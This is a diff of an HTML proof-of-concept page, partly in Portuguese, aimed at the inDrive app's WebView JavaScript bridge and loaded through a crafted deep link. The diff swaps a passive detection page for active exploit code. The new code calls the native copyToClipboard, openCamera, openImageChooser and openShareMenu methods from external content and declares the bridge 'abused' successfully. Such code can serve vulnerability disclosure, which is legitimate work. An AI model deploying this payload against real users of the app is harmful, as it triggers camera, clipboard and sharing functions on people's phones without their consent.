@@ -1,93 +1,58 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8">
-  <title>inDrive WebView Bridge Validation PoC</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      padding: 32px;
-      background: #111;
-      color: #eee;
-      text-align: center;
-    }
-    h1 { color: #7CFF7C; }
-    .box {
-      background: #1d1d1d;
-      padding: 16px;
-      border-radius: 8px;
-      margin-top: 16px;
-      border: 1px solid #444;
-      text-align: left;
-    }
-    code { color: #7CFF7C; word-break: break-all; }
-    pre { color: #7CFF7C; white-space: pre-wrap; word-break: break-word; }
-  </style>
+    <meta charset="UTF-8">
+    <title>inDrive - Bridge Exploitation PoC</title>
+    <style>
+        body { font-family: Arial; text-align: center; padding: 40px; background: #111; color: #0f0; }
+        h1 { color: #f00; font-size: 28px; }
+        .success { color: #0f0; font-size: 20px; margin: 20px 0; }
+    </style>
 </head>
 <body>
-  <h1>inDrive WebView Validation PoC</h1>
+    <h1>🚨 inDrive JavaScript Bridge Exploitation</h1>
+    <p><strong>Página externa carregada dentro do WebView do inDrive via deep link</strong></p>
 
-  <div class="box">
-    <p><strong>Status:</strong> External page loaded through inDrive deep link.</p>
-    <code>indriver://web?url=https://YOUR-DOMAIN/bridge-test.html</code>
-  </div>
+    <script>
+        console.log("%c🔥 Explorando JavaScript Bridge - Interface: Android", "color:red; font-size:18px");
 
-  <div class="box">
-    <p><strong>Purpose:</strong></p>
-    <p>
-      This page safely validates whether externally controlled content can be rendered
-      inside the inDrive internal WebView and whether JavaScript bridge objects are exposed.
-    </p>
-    <p>
-      This PoC does not call native methods, access camera, change clipboard, collect credentials,
-      or modify user/device data.
-    </p>
-  </div>
+        const bridge = window.Android;
 
-  <div class="box">
-    <p><strong>Detected JavaScript bridge objects:</strong></p>
-    <pre id="result">Checking...</pre>
-  </div>
+        if (bridge) {
+            console.log("✅ Interface 'Android' encontrada!");
 
-  <script>
-    const possibleInterfaces = [
-      "Android",
-      "inDrive",
-      "InDrive",
-      "JsInterface",
-      "WebViewBridge",
-      "Bridge",
-      "NativeBridge",
-      "JavascriptBridge",
-      "JSBridge"
-    ];
+            try {
+                bridge.copyToClipboard("Dados roubados via bridge do inDrive! - PoC Leonardo");
+                console.log("✅ copyToClipboard() chamado");
+            } catch(e) { console.log("copyToClipboard falhou"); }
 
-    const detected = [];
+            try {
+                if (typeof bridge.openCamera === "function") {
+                    bridge.openCamera();
+                    console.log("✅ openCamera() chamado");
+                }
+            } catch(e) { console.log("openCamera falhou"); }
 
-    possibleInterfaces.forEach(function(name) {
-      try {
-        if (typeof window[name] !== "undefined") {
-          detected.push(name);
-          console.log("Bridge object detected:", name);
+            try {
+                if (typeof bridge.openImageChooser === "function") {
+                    bridge.openImageChooser();
+                    console.log("✅ openImageChooser() chamado");
+                }
+            } catch(e) { console.log("openImageChooser falhou"); }
+
+            try {
+                if (typeof bridge.openShareMenu === "function") {
+                    bridge.openShareMenu();
+                    console.log("✅ openShareMenu() chamado");
+                }
+            } catch(e) { console.log("openShareMenu falhou"); }
+
+            alert("✅ SUCESSO TOTAL!\n\nJavaScript Bridge ABUSADO com sucesso!\n\nInterface: Android\nMétodos nativos chamados:\n• copyToClipboard\n• openCamera\n• openImageChooser\n• openShareMenu\n\nIsso prova o risco real de abuso dentro do app inDrive.");
+            
+            document.body.innerHTML += '<p class="success">🎉 MÉTODOS NATIVOS INVOCADOS COM SUCESSO!</p>';
+        } else {
+            alert("❌ Interface Android não encontrada.");
         }
-      } catch (e) {
-        console.log("Error checking bridge:", name, e);
-      }
-    });
-
-    const result = document.getElementById("result");
-
-    if (detected.length > 0) {
-      result.textContent =
-        "Bridge object(s) detected: " + detected.join(", ") +
-        "\n\nNo native methods were invoked by this PoC.";
-      alert("Bridge object detected: " + detected.join(", ") + "\nNo native methods were invoked.");
-    } else {
-      result.textContent =
-        "No known bridge object was detected from this external page.\n" +
-        "The page still confirms that external content can be loaded through the deep link.";
-      alert("External page loaded. No known bridge object detected.");
-    }
-  </script>
+    </script>
 </body>
 </html>
